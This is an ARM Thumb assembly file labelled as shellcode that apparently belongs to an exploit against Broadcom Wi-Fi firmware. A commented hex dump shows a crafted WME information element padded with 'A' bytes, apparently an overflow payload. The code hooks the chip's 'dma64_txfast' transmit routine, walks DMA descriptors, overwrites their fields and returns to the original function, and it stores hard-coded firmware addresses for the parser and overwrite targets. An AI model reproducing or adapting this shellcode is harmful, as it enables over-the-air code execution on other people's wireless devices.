	.syntax unified
	.cpu cortex-a9
	.fpu softvfp
	.eabi_attribute 20, 1
	.eabi_attribute 21, 1
	.eabi_attribute 23, 3
	.eabi_attribute 24, 1
	.eabi_attribute 25, 1
	.eabi_attribute 26, 2
	.eabi_attribute 30, 4
	.eabi_attribute 34, 1
	.eabi_attribute 18, 4
	.thumb
//	.file	"shellcode.c"
	.text
	.align	1
	.global	dma64_txfast_hook
	.thumb
/*
00217014: 00 50 f2 02 01 01 00 00 03 a4 00 00 27 a4 00 00   .P..........'...
00217024: 42 43 5e 00 62 32 2f 00 00 00 00 00 00 00 00 00   BC^.b2/.........
00217034: c0 0b e0 05 00 00 00 00 00 00 00 00 78 00 00 00   ............x...
00217044: 00 00 00 00 00 00 41 41 00 00 00 00 00 00 00 41   ......AA.......A
00217054: 00 00 41 41 00 00 00 00 41 41 41 41 00 00 00 00   ..AA....AAAA....
00217064: 00 00 41 41 41 41 41 41 41 41 41 41 41 41 41 41   ..AAAAAAAAAAAAAA
00217074: 41 41 41 41 00 00 00 00 41 41 41 41 00 00 00 00   AAAA....AAAA....
00217084: c8 70 21 00 00 41 41 41 00 00 00 00 41 41 41 41   .p!..AAA....AAAA
00217094: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
002170a4: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
002170b4: 00 41 41 41 41 41 41 41 41 41 41 41 28 00 00 00   .AAAAAAAAAAA(...
002170c4: 00 00 00 00 84 b6 18 00 d0 70 21 00 5e 07 34 79   .........p!.^.4y
002170d4: 00 00 00 00 2d e9 f0 43 0f b4 00 bf 00 bf 0f bc   ....-..C........
002170e4: 74 f7 d4 ba 80 84 24 00 00 00 00 00 24 01 00 00   t.....$.....$...
002170f4: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00217104: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
*/
hook_entry: // 0x90
	push {r0-r3,r4-r9,lr} // 0x217090
	bl dma64_txfast_hook_direct // 0x217094
	pop {r0-r3} // 0x217098
	.word 0xbaf9f774 // 0x21709a: branch to original txfast

	.thumb_func
	.type	dma64_txfast_hook, %function
dma64_txfast_hook:
dma64_txfast_hook_direct:
	@ args = 0, pretend = 0, frame = 0
	@ frame_needed = 0, uses_anonymous_args = 0
	ldr	r3, .L5 // 0x21709e
	movw	r2, #18288 // 0x2170a0
	push	{r4, lr} // 0x2170a4
	strh	r2, [r3]	@ movhi // 0x2170a6
	ldr	r3, [r0, #32] // 0x2170a8
	ldr	r2, .L5+4 // 0x2170aa
	cmp	r3, r2 // 0x2170ac
	bne	.L1 // 0x2170ae
	ldr	r3, [r0, #60] // 0x2170b0
	b skippast // 0x2170b2
	nop // 0x2170ab4 - is modified
skippast:
	movs	r2, #0 // 0x2170b6
	ldr	r0, .L5+8 // 0x2170b8
	ldr	r1, .L5+12 // 0x2170ba
.L3:
	ldr	r4, [r3, #8] // 0x2170dc
	b skippast2 // 0x2170be
	.fill 0x2170d8 - 0x2170c0 // 0x2170c0
skippast2:
	cmp	r4, r0 // 0x2170d8
	beq	.L1 // 0x2170da
	str	r1, [r3, #8] // 0x2170dc
	adds	r3, r3, #16 // 0x2170de
	str	r2, [r3, #-4] // 0x2170e0
	b	.L3 // 0x2170e4
.L1:
	pop	{r4, pc} // 0x2170e6
.L6:
	.align	2
.L5:
	.word	1805008 // 0x2170e8
	.word	4731460 // 0x2170ec
	.word	-559038737 // 0x217100
	.word	528948 // 0x217104
	.size	dma64_txfast_hook, .-dma64_txfast_hook
	.global	overwrite_addr_high
	.global	overwrite_addr_low
	.global	wlc_bss_parse_wme_ie_addr
	.section	.rodata
	.align	2
	.type	overwrite_addr_high, %object
	.size	overwrite_addr_high, 4
overwrite_addr_high:
	.space	4
	.type	overwrite_addr_low, %object
	.size	overwrite_addr_low, 4
overwrite_addr_low:
	.word	528948
	.type	wlc_bss_parse_wme_ie_addr, %object
	.size	wlc_bss_parse_wme_ie_addr, 4
wlc_bss_parse_wme_ie_addr:
	.word	1805008
	.ident	"GCC: (GNU) 4.8"
	.section	.note.GNU-stack,"",%progbits
